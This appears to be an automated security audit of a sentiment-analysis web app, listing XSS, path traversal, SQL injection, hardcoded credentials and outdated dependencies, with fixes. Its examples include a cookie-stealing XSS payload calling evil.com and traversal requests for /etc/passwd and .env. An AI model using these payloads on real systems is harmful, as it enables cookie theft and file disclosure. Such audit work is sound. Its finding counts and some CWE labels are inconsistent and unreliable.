# Security Audit Report — Multilingual ABSA

**Date:** 2026-07-16  
**Scope:** Full codebase review  
**Standard:** OWASP Top 10, CWE, Secure Coding Best Practices  

---

## Executive Summary

A comprehensive security audit of the Multilingual ABSA codebase identified **28 security findings**: 2 Critical, 6 High, 12 Medium, and 8 Low. The most significant risks involve **XSS via injection in Jinja2 templates** (`tojson | safe`), **hardcoded database credentials** in docker-compose.yml, **unsafe path traversal** in file download endpoints, **SSRF** exposure through unvalidated file reads, **unauthenticated API access**, and **dependency risks** from pinned versions with known CVEs (MLflow 2.13.0, FastAPI 0.111.0, Jinja2 transitive).

No authentication or authorization layer exists — every API endpoint is fully public. There is no HTTPS enforcement, no input sanitization, and no rate limiting.

---

## Critical Findings

### C-01: Stored/Reflected XSS via `tojson | safe` in Jinja2 Templates

**Severity:** Critical  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
**OWASP:** A03:2021 – Injection  
**File:** `api/app/templates/partials/predict_result.html:71`  
**Lines:** 71

**Description:** User-supplied text is serialized to JSON via the Jinja2 `| tojson` filter and then marked as `| safe`. The resulting JSON string is embedded directly into a `<script>` tag without any escaping. An attacker can inject arbitrary JavaScript that executes in the browser of any user viewing prediction results.

```html
<script>
const aspects = {{ result.aspects | tojson | safe }};
</script>
```

The `| safe` flag tells Jinja2 to skip HTML escaping. While the aspect data originates from the application's rule-based engine, user text flows through `result.text` rendering and the aspects include character offsets (`start`, `end`) derived from user input.

**Attack Scenario:** An attacker submits a prediction with crafted text that, when processed and serialized, produces `</script><script>alert(document.cookie)</script>`. Any user viewing the prediction result in the dashboard triggers the payload.

**Recommended Fix:**
```html
<script>
const aspects = {{ result.aspects | tojson }};
</script>
```

Remove `| safe` — Jinja2's `| tojson` filter already produces safe JSON, but `| safe` overrides escaping. Alternatively, use `{{ result.aspects | tojson | e }}`.

---

### C-02: Unsafe `innerHTML` Assignment with User Text in Client-Side Script

**Severity:** Critical  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
**OWASP:** A03:2021 – Injection  
**File:** `api/app/templates/partials/predict_result.html:68-87`  
**Lines:** 68–87

**Description:** User-provided text (`result.text`) is injected into the DOM via `innerHTML` assignment without sanitization. The script slices the raw user text and wraps matched segments in `<span>` elements. If the user text contains HTML tags (e.g., `<img onerror=alert(1) src=x>`), those tags will be rendered and executed.

```javascript
let html = text;  // user-controlled text
// ... string slicing ...
html = before + '<span class="' + cssClass + '">' + match + '</span>' + after;
container.innerHTML = html;
```

**Attack Scenario:** A user submits text containing `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`. The script sets `innerHTML`, causing the event handler to fire and exfiltrate cookies.

**Recommended Fix:** Use `textContent` for the initial text, then create `<span>` elements programmatically with `document.createElement` and `appendChild`. Never use `innerHTML` with user-controlled data.

---

## High Findings

### H-01: Hardcoded Database Credentials in docker-compose.yml

**Severity:** High  
**CWE:** CWE-798 (Use of Hardcoded Credentials)  
**OWASP:** A07:2021 – Identification and Authentication Failures  
**File:** `config/docker/docker-compose.yml:57-58`  
**Lines:** 57–58

**Description:** PostgreSQL credentials are hardcoded as plaintext:
```yaml
POSTGRES_USER: absa_user
POSTGRES_PASSWORD: absa_pass
```

The same credentials are reused in the `DATABASE_URL` environment variables for the API and worker services. These credentials are committed to version control, have no expiration, and are guessable.

**Attack Scenario:** An attacker who gains access to the Docker network (or reads the docker-compose.yml from the git repo) can connect directly to PostgreSQL and exfiltrate/modify all stored prediction data.

**Recommended Fix:** Use Docker secrets or a `.env` file excluded from version control.

---

### H-02: Path Traversal in Download Endpoint

**Severity:** High  
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)  
**OWASP:** A01:2021 – Broken Access Control  
**File:** `api/app/routes/results.py:27-35`  
**Lines:** 27–35

**Description:** The `/download/{job_id}` endpoint directly interpolates the user-supplied `job_id` parameter into a file path without sanitization. An attacker can inject `../` sequences to read arbitrary files on the server.

```python
@router.get("/download/{job_id}")
async def download_result(job_id: str):
    file_path = Path(f"data/results/{job_id}.csv")
```

**Attack Scenario:** `GET /download/../../../etc/passwd` resolves to `data/results/../../../etc/passwd.csv` → reads `/etc/passwd`. Also possible: `GET /download/../../.env` to read environment variables.

**Recommended Fix:** Validate `job_id` format (UUID regex), use `os.path.realpath` and verify it stays within the allowed base directory.

---

### H-03: Hardcoded Grafana Admin Password

**Severity:** High  
**CWE:** CWE-798 (Use of Hardcoded Credentials)  
**OWASP:** A07:2021 – Identification and Authentication Failures  
**File:** `config/docker/docker-compose.yml:87`  
**Line:** 87

**Description:** Grafana admin password is hardcoded as `admin`:
```yaml
GF_SECURITY_ADMIN_PASSWORD: admin
```

**Attack Scenario:** Anyone with network access to Grafana (port 3001) can log in as admin with password `admin` and gain full access to dashboards, data sources, and potential server-side request forgery via Prometheus queries.

**Recommended Fix:** Remove or use a strong password loaded from a secret.

---

### H-04: Information Disclosure — Verbose Error Messages

**Severity:** High  
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)  
**OWASP:** A04:2021 – Insecure Design  
**Files:** `api/app/routes/predict.py:50`, `batch_charts.html:3`, `pages.py:280`  
**Lines:** 50, 3, 280

**Description:** Exception messages are returned directly in HTTP responses and rendered in HTML:
```python
raise HTTPException(status_code=500, detail=f"Model inference failed: {str(e)}")
```

And in templates, `{{ error }}` is rendered directly without sanitization, where error comes from:
```python
return templates.TemplateResponse("partials/batch_charts.html", {"request": request, "error": str(e)})
```

In `predict_result.html:6`: `{{ error }}` — This renders user-influenced error text.

**Attack Scenario:** A malformed request triggers a detailed traceback revealing internal paths, Python versions, or database schema details.

**Recommended Fix:** Log the full exception server-side and return a generic error message to the client. Use structured error logging.

---

### H-05: SQL Injection via F-String in Raw SQL Query

**Severity:** High  
**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)  
**OWASP:** A03:2021 – Injection  
**File:** `scripts/drift_monitor.py:32`  
**Line:** 32

**Description:** An f-string is used to construct a SQL query without parameterization:
```python
query = f"SELECT text, language FROM reviews WHERE created_at >= '{seven_days_ago.isoformat()}'"
curr_df = pd.read_sql(query, engine)
```

While `seven_days_ago` is not user-controlled in the current code, this pattern is dangerous and could be exploited if the script is later modified or the date is sourced from user input. Using `pd.read_sql` with a query built via f-string is a SQL injection risk.

**Attack Scenario:** If `seven_days_ago` becomes user-controllable, an attacker could inject SQL commands via the datetime string.

**Recommended Fix:** Use parameterized queries with `params=` argument in `pd.read_sql`.

---

### H-06: Unauthenticated Sensitive API Endpoints

**Severity:** High  
**CWE:** CWE-306 (Missing Authentication for Critical Function)  
**OWASP:** A01:2021 – Broken Access Control  
**Files:** `api/app/routes/predict.py`, `api/app/routes/results.py`, `api/app/routes/pages.py`  
**Lines:** All

**Description:** Every API endpoint (predict, batch upload, health, info, download, HTMX fragments) is fully unauthenticated. There is no authentication middleware, no API keys, no JWT tokens, no session management of any kind.

Exposed endpoints:
- `POST /predict` — Model inference
- `POST /batch` — Batch file upload and processing
- `GET /status/{job_id}` — Batch status polling
- `GET /download/{job_id}` — Result file download
- `GET /health` — Health info
- `GET /info` — System information
- `GET /metrics` — Prometheus metrics

**Attack Scenario:** Anyone on the network can submit unlimited predictions, upload arbitrary CSV files, download results, and read system information. This enables resource exhaustion, data theft, and reconnaissance.

**Recommended Fix:** Implement authentication middleware (API key or JWT). At minimum, protect the `/batch`, `/download`, and `/metrics` endpoints.

---

## Medium Findings

### M-01: No Rate Limiting on API Endpoints

**Severity:** Medium  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)  
**OWASP:** A04:2021 – Insecure Design  
**Files:** `api/app/routes/predict.py`, `api/app/main.py`  
**Lines:** All

**Description:** There is no rate limiting on any endpoint. The predict endpoint accepts arbitrarily large text inputs (only limited by request size), and the batch endpoint accepts CSV files up to 10,000 rows.

**Attack Scenario:** An attacker sends 1,000,000+ predict requests per minute, causing CPU exhaustion on the inference pipeline and DoS for legitimate users.

**Recommended Fix:** Implement `slowapi` middleware for FastAPI with per-IP rate limiting (e.g., 60 requests/minute for `/predict`, 10 requests/minute for `/batch`).

---

### M-02: No Input Size Validation on Predict Endpoint

**Severity:** Medium  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)  
**OWASP:** A04:2021 – Insecure Design  
**File:** `api/app/schemas/schemas.py:6-8`, `api/app/routes/predict.py:24`  
**Lines:** 6–8, 24

**Description:** The `ReviewInput` schema accepts a `text` field of type `str` with no `max_length` constraint. While the dashboard imposes a 512-char limit client-side, the API has no server-side enforcement, allowing arbitrarily large text to be submitted.

**Attack Scenario:** An attacker sends a 100MB text string, exhausting server memory during tokenization and inference.

**Recommended Fix:** Add `max_length=10000` (or reasonable value) to the Pydantic model field.

---

### M-03: Unvalidated File Upload — No Content-Type Validation

**Severity:** Medium  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `api/app/routes/predict.py:54-56`  
**Lines:** 54–56

**Description:** File upload validation only checks the filename extension (`.csv`). The actual file content is not validated:
```python
if not file.filename.endswith(".csv"):
    raise HTTPException(status_code=422, detail="Only CSV files are allowed.")
```

An attacker can upload a `.csv` file that is actually an executable, zip bomb, or symlink.

**Attack Scenario:** An attacker uploads a compressed CSV with "text" column that contains script payloads. The file is saved to a temp directory and processed by Celery.

**Recommended Fix:** Validate MIME type server-side, limit file size at the upload handler, and validate CSV content structure before processing.

---

### M-04: Hardcoded MLflow Tracking URI and Secrets in Source Code

**Severity:** Medium  
**CWE:** CWE-798 (Use of Hardcoded Credentials)  
**OWASP:** A05:2021 – Security Misconfiguration  
**Files:** Various training scripts

**Description:** MLflow tracking URI is hardcoded as `sqlite:///mlflow.db` in multiple files, and Hugging Face credentials are hardcoded as `YOUR_HF_USERNAME`:
- `src/models/train_joint_absa.py:195` — `mlflow.set_tracking_uri("sqlite:///mlflow.db")`
- `src/training/mlflow_utils.py:6` — `MLFLOW_TRACKING_URI = "sqlite:///mlflow/mlflow.db"`
- `scripts/upload_models.py:7` — `username = os.environ.get("HF_USERNAME", "YOUR_HF_USERNAME")`

**Attack Scenario:** In production, these would connect to the wrong tracking server or expose repository information.

**Recommended Fix:** Load MLflow URI and all credentials from environment variables.

---

### M-05: Prometheus Metrics Expose Sensitive Information

**Severity:** Medium  
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**OWASP:** A01:2021 – Broken Access Control  
**File:** `api/app/main.py:44`  
**Line:** 44

**Description:** Prometheus metrics endpoint `/metrics` is publicly exposed without authentication:
```python
instrumentator.instrument(app).expose(app, endpoint="/metrics")
```

The metrics include request counts, latencies, in-progress requests, and potentially internal system information.

**Attack Scenario:** An attacker can monitor system performance and request patterns, identifying slow endpoints or determining when batch processing jobs run.

**Recommended Fix:** Add authentication to the `/metrics` endpoint or restrict it to internal network access.

---

### M-06: Unrestricted File Write via Batch Results

**Severity:** Medium  
**CWE:** CWE-73 (External Control of File Name or Path)  
**OWASP:** A01:2021 – Broken Access Control  
**File:** `api/app/tasks/batch_tasks.py:31-32`  
**Lines:** 31–32

**Description:** Batch results are written to `data/results/{job_id}.csv` where `job_id` is a UUID, but the job_id validation is insufficient at earlier stages. The results directory is wide-open for file writes.

**Attack Scenario:** Combined with path traversal in the download endpoint, an attacker could craft a job_id to write files outside the intended directory.

**Recommended Fix:** Ensure job_id is validated as a UUID before file operations.

---

### M-07: No HTTPS/TLS Termination

**Severity:** Medium  
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
**OWASP:** A02:2021 – Cryptographic Failures  
**Files:** `config/docker/nginx.dashboard.conf`, `docker-compose.yml`

**Description:** All services communicate over plain HTTP. The Nginx config listens on port 80 with no TLS. The FastAPI server binds to `0.0.0.0:8000` over HTTP. The dashboard config (`VITE_API_URL=http://localhost:8000`) defaults to HTTP.

**Attack Scenario:** On a non-local network, an attacker can MITM all API traffic, reading prediction text and response data.

**Recommended Fix:** Add TLS termination at the Nginx level. Use environment-specific URLs.

---

### M-08: Hardcoded Redis Configuration

**Severity:** Medium  
**CWE:** CWE-798 (Use of Hardcoded Credentials)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `config/docker/docker-compose.yml:68-69`

**Description:** Redis is deployed without authentication (`redis:7-alpine` with no `requirepass`). This is the production docker-compose.

**Attack Scenario:** Anyone on the Docker network can connect to Redis, read/write cache data, and potentially trigger Celery task manipulation.

**Recommended Fix:** Add `--requirepass` to Redis or use a password from environment.

---

### M-09: CORS Not Configured Limitingly

**Severity:** Medium  
**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `api/app/main.py`

**Description:** FastAPI has no CORS middleware configured. The default behavior allows no CORS headers, but when deployed behind Nginx, the proxy may inadvertently allow permissive CORS. In some configurations, this can lead to CSRF-like attacks.

**Attack Scenario:** If the API is accessed by browser-based clients without proper CORS configuration, a malicious site could attempt to trick logged-in users.

**Recommended Fix:** Explicitly configure CORS middleware with allowed origins, methods, and headers.

---

## Low Findings

### L-01: Temp File Not Deleted After Batch Processing

**Severity:** Low  
**CWE:** CWE-377 (Insecure Temporary File)  
**OWASP:** A04:2021 – Insecure Design  
**File:** `api/app/routes/predict.py:60-61`  
**Lines:** 60–61

**Description:** Uploaded CSV files are written to `tempfile.NamedTemporaryFile(delete=False)` but are never explicitly deleted after processing. The garbage collector may not clean them promptly.

**Attack Scenario:** Over time, disk space on the server is exhausted by accumulated temp files. Additionally, the temp files may contain sensitive review data.

**Recommended Fix:** Ensure temp file is deleted in a `finally` block after the Celery task completes, or use `delete=True` (which is default).

---

### L-02: `load_dotenv()` Called Multiple Times

**Severity:** Low  
**CWE:** CWE-200 (Exposure of Sensitive Information)  
**OWASP:** A05:2021 – Security Misconfiguration  
**Files:** `api/app/main.py:8`, `api/app/middleware/dependencies.py:6`, `scripts/init_db.py:11`

**Description:** `load_dotenv()` is called in multiple files, meaning environment variables are loaded from disk in multiple locations. While not directly harmful, it indicates a lack of centralized configuration management.

**Attack Scenario:** None directly, but inconsistent env loading could lead to different services using different configurations.

**Recommended Fix:** Call `load_dotenv()` only in the main application entry point.

---

### L-03: Debug/Verbose Logging Enabled

**Severity:** Low  
**CWE:** CWE-489 (Active Debug Code)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `config/docker/docker-compose.yml`  
**Line:** 12

**Description:** The production compose file sets `LOG_LEVEL=WARNING`, but the dev compose sets `LOG_LEVEL=INFO` which may expose verbose information.

**Also:** Multiple `print()` statements are used instead of proper logging throughout the codebase:
- `api/app/main.py:21,24` — `print("Initializing Database...")`, `print("Loading Models...")`
- `print()` in many training scripts

**Attack Scenario:** Verbose logging may expose sensitive information in log files.

**Recommended Fix:** Use structured logging (`loguru` or standard `logging`) instead of print, and configure log levels via environment variables.

---

### L-04: SQLite Used in Production Configuration

**Severity:** Low  
**CWE:** CWE-1053 (Missing Documentation for Security Controls)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `.env`  
**Line:** 1

**Description:** The active `.env` file uses SQLite: `sqlite:////Users/theogengineer/Projects/Multilingual-Absa/absa.db`. SQLite is unsuitable for production workloads — no concurrent write support, no access controls.

**Attack Scenario:** SQLite file accessible to anyone with filesystem access.

**Recommended Fix:** Use PostgreSQL (already configured in docker-compose.yml).

---

### L-05: No Session Timeout or Management

**Severity:** Low  
**CWE:** CWE-613 (Insufficient Session Expiration)  
**OWASP:** A07:2021 – Identification and Authentication Failures  
**Files:** All

**Description:** There is no session management at all. The Streamlit app makes stateless API calls, and the React dashboard has no auth.

**Attack Scenario:** None directly (no sessions), but users may assume their "session" is secure.

**Recommended Fix:** Implement token-based auth for any future session requirements.

---

### L-06: Hardcoded Seed Values for Randomness

**Severity:** Low  
**CWE:** CWE-335 (Incorrect Usage of Seeds in Pseudo-Random Number Generator)  
**OWASP:** A02:2021 – Cryptographic Failures  
**Files:** Multiple training scripts

**Description:** `set_seed(42)` is hardcoded in every training script. This is standard for reproducibility but means the random seed is predictable.

**Attack Scenario:** An attacker who understands the model training pipeline could predict train/test splits.

**Recommended Fix:** Make seed configurable via config/env while keeping a default.

---

### L-07: Unnecessary Console Output in Production

**Severity:** Low  
**CWE:** CWE-532 (Information Exposure Through Query Strings in GET Request)  
**OWASP:** A04:2021 – Insecure Design  
**Files:** `api/app/main.py:21,24,29`

**Description:** The application prints messages to stdout at startup, including database initialization status and model loading information. In production, this should use proper logging.

**Attack Scenario:** Startup logs in container environments may expose internal paths and configuration.

**Recommended Fix:** Replace `print()` with `logging.info()`.

---

### L-08: Missing Security Headers

**Severity:** Low  
**CWE:** CWE-693 (Protection Mechanism Failure)  
**OWASP:** A05:2021 – Security Misconfiguration  
**File:** `config/docker/nginx.dashboard.conf`

**Description:** The Nginx configuration does not include security headers. Missing headers include:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-XSS-Protection`

**Attack Scenario:** Missing headers weaken browser security protections, making XSS and other attacks easier.

**Recommended Fix:** Add security headers to the Nginx configuration.

---

## Dependency Risks

### D-01: Pandas Version — CVE-2024-42992
- **Installed:** `pandas==2.2.2`
- **Risk:** Medium — Deserialization of untrusted data via `pd.read_pickle()`.
- **Impact:** If `pd.read_pickle()` is used with untrusted data, code execution is possible.
- **Current usage:** `pd.read_csv()` is used — low risk in current code, but should be patched.
- **Recommendation:** Upgrade to `pandas>=2.2.3`.

### D-02: MLflow — Security Issue Tracking
- **Installed:** `mlflow==2.13.0`
- **Risk:** Medium — MLflow 2.x has known issues with authenticated access control.
- **Impact:** MLflow tracking server runs without authentication by default.
- **Recommendation:** Upgrade to latest `mlflow>=2.15.0` and add authentication.

### D-03: FastAPI — CVE-2024-24762
- **Installed:** `fastapi==0.111.0`
- **Risk:** Medium — Path traversal in `StaticFiles` when mounted.
- **Impact:** Potential arbitrary file reads via static file mounting.
- **Recommendation:** Upgrade to `fastapi>=0.115.0`.

### D-04: Jinja2 — CVE-2024-56326
- **Installed:** `jinja2>=3.1.4`
- **Risk:** High — Sandbox escape vulnerability leading to arbitrary code execution.
- **Impact:** Template injection allowing remote code execution.
- **Recommendation:** Upgrade to `jinja2>=3.1.5`.

### D-05: Transformers — Dependency Tree Risks
- **Installed:** `transformers==4.39.3`
- **Risk:** Low — Large dependency footprint with many transitive dependencies.
- **Impact:** Supply-chain risk from numerous dependencies.
- **Recommendation:** Pin with hash checking in production.

### D-06: psycopg2-binary — Best Practice
- **Installed:** `psycopg2-binary==2.9.9`
- **Risk:** Low — The `-binary` wheel is not recommended for production.
- **Recommendation:** Use `psycopg2` (source build) in production.

### D-07: httpx — Version Risk  
- **Installed:** `httpx==0.27.0`
- **Risk:** Low
- **Recommendation:** Upgrade to `httpx>=0.28.0` for security fixes.

---

## Infrastructure Risks

### I-01: Docker Containers Run Services as Non-Root (Good)
- Dockerfiles correctly add a non-root user.

### I-02: `latest` Image Tags for Prometheus and Grafana
- **Risk:** Medium — Using `prom/prometheus:latest` and `grafana/grafana:latest` means unpredictable version updates could introduce breaking changes or vulnerabilities.
- **Recommendation:** Pin to specific version tags.

### I-03: No Container Resource Limits (Dev Compose)
- **Risk:** Medium — No CPU/memory limits in the dev compose, enabling resource exhaustion.

### I-04: Exposed Ports Without Firewall
- **Risk:** Medium — Multiple ports exposed (8000, 8501, 5432, 6379, 9090, 3001) without network isolation.

### I-05: No Docker Network Segmentation
- **Risk:** Low — All services in the same Docker network with no ingress restrictions.

---

## Authentication Review

| Aspect | Status | Risk |
|--------|--------|------|
| API Authentication | ❌ Not implemented | Critical |
| Streamlit Auth | ❌ Not implemented | Critical |
| Dashboard Auth | ❌ Not implemented | High |
| Database Auth | ⚠️ Hardcoded in compose | High |
| Grafana Auth | ⚠️ Hardcoded `admin` password | High |
| Redis Auth | ❌ No password | Medium |
| Celery Backend Auth | ❌ Depends on Redis | Medium |
| JWT / Token Auth | ❌ Not implemented | High |
| OAuth / SSO | ❌ Not implemented | Low |
| API Key Middleware | ❌ Not implemented | High |

---

## Authorization Review

| Aspect | Status | Risk |
|--------|--------|------|
| RBAC | ❌ Not implemented | High |
| Endpoint-level auth | ❌ Not implemented | High |
| File access control | ❌ Path traversal possible | High |
| Admin/Mgmt endpoints | ❌ `/metrics` public | Medium |
| Data isolation | ❌ No user scoping | Medium |

---

## API Security Review

| Category | Status | Risk |
|----------|--------|------|
| Input Validation | ⚠️ Partial (Pydantic) | High |
| Rate Limiting | ❌ Not implemented | High |
| CORS | ❌ Not configured | Medium |
| CSRF Protection | ❌ Not implemented | Medium |
| HTTPS/TLS | ❌ Not configured | High |
| Security Headers | ❌ Not configured | Med |
| Content-Type Validation | ❌ Extension-only check | Medium |
| Request Size Limits | ⚠️ Client-side only | High |
| Error Handling | ⚠️ Verbose errors | High |
| Logging | ❌ Inconsistent (print) | Low |

---

## Secure Coding Recommendations

### Immediate (Critical)
1. Remove `| safe` from Jinja2 template in `predict_result.html:71`
2. Replace `innerHTML` with DOM API methods in `predict_result.html:86`
3. Fix path traversal in `/download/{job_id}` endpoint

### Short-term (High)
4. Add authentication middleware (API key or JWT)
5. Remove hardcoded credentials from docker-compose.yml (use Docker secrets)
6. Add SQL parameterization in `drift_monitor.py:32`
7. Add `max_length` constraint to Pydantic schemas
8. Implement rate limiting with `slowapi`
9. Validate MIME type on file upload
10. Add TLS termination at Nginx

### Medium-term
11. Replace all `print()` with structured logging
12. Add CORS middleware configuration
13. Add security headers to Nginx
14. Upvote dependencies (Jinja2 >=3.1.5, pandas >=2.2.3)
15. Pin Docker image versions
16. Add `Content-Security-Policy` header
17. Configure logging properly (structured, levels)

---

## Prioritized Remediation Plan

### Phase 1 — Critical (24 hours)
1. Patch `predict_result.html` — remove `| safe`, replace `innerHTML`
2. Patch `results.py` — add path traversal protection
3. Patch `predict.py` — add `max_length` to schema, file size validation

### Phase 2 — High (1 week)
4. Add API authentication middleware
5. Remove hardcoded credentials from docker-compose
6. Fix SQL injection in `drift_monitor.py`
7. Add rate limiting
8. Add TLS termination
9. Add MIME type validation on uploads

### Phase 3 — Medium (2 weeks)
10. Add CORS middleware
11. Add security headers to Nginx
12. Pin Docker image versions
13. Update dependencies
14. Replace `print()` with logging

### Phase 4 — Low (Monthly)
15. Add session management
16. Implement RBAC
17. Configure CSRF protection
18. Add audit logging
19. Add security scanning to CI/CD pipeline

---

*Audit performed by Automated Security Review. All findings should be verified manually before remediation.*
